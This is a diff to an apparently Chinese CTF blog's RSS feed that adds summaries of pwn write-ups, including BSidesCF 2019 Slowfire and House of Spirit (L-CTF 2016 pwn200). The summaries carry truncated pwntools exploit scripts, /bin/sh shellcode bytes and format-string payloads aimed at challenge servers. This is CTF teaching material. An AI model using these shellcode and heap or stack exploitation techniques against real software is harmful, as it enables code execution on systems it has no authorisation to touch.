@@ -16,6 +16,22 @@
     </item>
     
     <item>
+      <title>BSidesCF 2019 Slowfire</title>
+      <link>https://jellyfish-pro.github.io/ctf/bsidescf-2019slowfire/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://jellyfish-pro.github.io/ctf/bsidescf-2019slowfire/</guid>
+      <description>[BSidesCF 2019]Slowfire 题目：[[BSidesCF 2019]Slowfire](https://buuoj.cn/challenges#[BSidesCF 2019]Slowfire)
+写在前面：
+以前做ctf都只注重漏洞的利用，但是现在发现，发现漏洞也很重要
+首先还是查看保护：
+这道题一个保护没开，本以为可以直接拿下，但是我天真了。
+找了半天没找到漏洞在哪里，最后去百度了一下才发现漏洞和以前接触的显而易见的溢出不一样：
+通过上面这张图，乍一看没问题，但是如果读取的长度大于0x400（比如0x500），当第一次循环的时候，因为buf_size的关系会读取0x400个字节，但是这时total的值为0x400。这时buf_size和total都为0x400，所以不会触发while，导致do又执行了一次，遭成了溢出。
+#!/usr/bin/python3from pwn import *context(arch=&amp;#39;amd64&amp;#39;, os=&amp;#39;linux&amp;#39;, log_level=&amp;#39;debug&amp;#39;)file_name = &amp;#39;./slowfire&amp;#39;p = remote(&amp;#39;node4.buuoj.cn&amp;#39;, 29861)elf = ELF(file_name)# open read writeshellcode = &amp;#39;&amp;#39;&amp;#39;mov edi, 0x4040c0mov esi, 0mov eax, 2 //opensyscallmov rdi, raxmov esi, 0x404180mov edx, 0x100mov eax, 0x401080	//readcall raxmov edi, DWORD PTR [rsp-0x444]mov esi, 0x404180mov edx, 0x100mov eax, 0x401040	//writecall rax&amp;#39;&amp;#39;&amp;#39;p.</description>
+    </item>
+    
+    <item>
       <title>enumcanary</title>
       <link>https://jellyfish-pro.github.io/ctf/enumcanary/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -243,6 +259,39 @@ leave = MOV RSP, RBPPOP RBP 通过这个指令会将RBP的值赋给RSP，那么
 1.利用程序创建目录的功能，在堆上写入一个虚假的栈。2.利用格式化字符串，修改函数的ebp3.当函数返回时，栈地址就会来到我们构建的虚假地址。 通过IDA我们可以看到程序并没有system函数和/bin/sh
 所以我们还是要泄露程序的libc版本：
 from pwn import *sh = process(&amp;#39;./format4&amp;#39;)#sh = remote(&amp;#39;10.0.25.109&amp;#39;,20004)contact = ELF(&amp;#39;./format4&amp;#39;)#context.log_level = &amp;#39;debug&amp;#39;#通过创建目录选项，输入payloaddef createcontact(name, phone, descrip_len, description):sh.recvuntil(&amp;#39;&amp;gt;&amp;gt;&amp;gt; &amp;#39;)sh.sendline(&amp;#39;1&amp;#39;)sh.recvuntil(&amp;#39;Contact info: \n&amp;#39;)sh.recvuntil(&amp;#39;Name: &amp;#39;)sh.sendline(name)sh.recvuntil(&amp;#39;You have 10 numbers\n&amp;#39;)sh.sendline(phone)sh.recvuntil(&amp;#39;Length of description: &amp;#39;)sh.sendline(descrip_len)sh.recvuntil(&amp;#39;description:\n\t\t&amp;#39;)sh.sendline(description)#输入payload后利用printf函数展示结果def printcontact():sh.recvuntil(&amp;#39;&amp;gt;&amp;gt;&amp;gt; &amp;#39;)sh.sendline(&amp;#39;4&amp;#39;)sh.recvuntil(&amp;#39;Contacts:&amp;#39;)sh.recvuntil(&amp;#39;Description: &amp;#39;)printf = 0x08048BD1# get system addr &amp;amp; binsh_addrpayload = &amp;#39;%31$paaaa&amp;#39;createcontact(&amp;#39;1111&amp;#39;, &amp;#39;1111&amp;#39;, &amp;#39;111&amp;#39;, payload)printcontact()libc_start_main_ret = int(sh.</description>
+    </item>
+    
+    <item>
+      <title>House_of_spirit</title>
+      <link>https://jellyfish-pro.github.io/ctf/house_of_spirit/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://jellyfish-pro.github.io/ctf/house_of_spirit/</guid>
+      <description>House_of_spirit HOS简单记录 对于*House_of_spirit（hos）*来说，该技术会涉及到许多技术细节，这里我只简单的记录一下，具体的细节可以查看CTF Wiki和安全客
+简单来说，当程序中存在如下图所示的内存时：
+这时我们就可以利用两个可控制区域将不可控区域伪造成堆块，然后释放进fastbin，随后我们再申请刚刚释放的堆块，这样就获得了不可控区域的控制权。
+也就意味着我们需要将内存构造成如下图这样：
+释放后进入fastbin，随后再申请fastbin，就可以获得这块区域的控制权。
+例题L-CTF2016 pwn200 这里我们使用L-CTF 2016中的pwn200，题目下载：BUUCTF在线评测 (buuoj.cn)
+首先先检测一下程序的基本信息和正常流程：
+可能是因为程序年代久远，所以什么保护都没有开。
+随后看看正常流程：
+第一步是循环获取48个字节。
+第二步将刚刚我们输入的内容输出，再让我们输入字符。
+第三步将刚刚输入的字符转换为int类型，随后出现菜单。
+程序的主要流程就是这些，那么这个程序有一些什么漏洞呢，这些漏洞又是怎么构成HOS攻击的呢？
+其实这个程序主要有两个漏洞：
+漏洞一： 这里函数采用的read函数，读取了48个字节，放入v2。但是read函数的问题在于，不会自动在结尾添加*\x00*。查看该函数的栈结构：
+可以看到v2下面就是rbp，那么如果我们直接输入48个字节后，程序再输出，就会将rbp给泄露出来。
+漏洞二： 这里buf的大小为0x38（56）字节，但是read时，会读取0x40个字节，这时就会产生0x8的溢出。
+我们也可以查看栈结构，看看溢出到了哪里：
+很明显，溢出到了dest上，通过代码，我们也知道dest是一个指针。
+栈结构 现在我们知道程序有这两个漏洞，那么这两个漏洞是怎么和HOS扯上关系的呢？
+我们画一个栈结构图就知道了：
+这里可以看到，如果我们想要控制vuln1_ret，就可以在buf中构造feak_chunk，然后让dest指向feak_chunk，随后free掉这个chunk，让其进入fastbin，随后再申请。（这里需要注意，这个伪造的chunk大小要包含vuln1_ret）
+这样我们修改新申请的chunk中的值，就可以修改ret了。
+同时我们泄露了main_stack中的rbp，我们就可计算出shellcode和feak_chunk的值。
+exp #!/usr/bin/python3from pwn import *context(arch = &amp;#39;amd64&amp;#39;, os = &amp;#39;linux&amp;#39;, log_level = &amp;#39;debug&amp;#39;)# c = process(&amp;#34;./pwn200&amp;#34;)p = remote(&amp;#39;node4.buuoj.cn&amp;#39;, 27122)# --------------------------------------------------------------------------------------------------------------# 将shellcode放入vuln1_stack，并且泄露出main函数的rbpshellcode = &amp;#34;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&amp;#34;payload = shellcode.ljust(44, &amp;#39;a&amp;#39;)payload += &amp;#39;.</description>
     </item>
     
     <item>
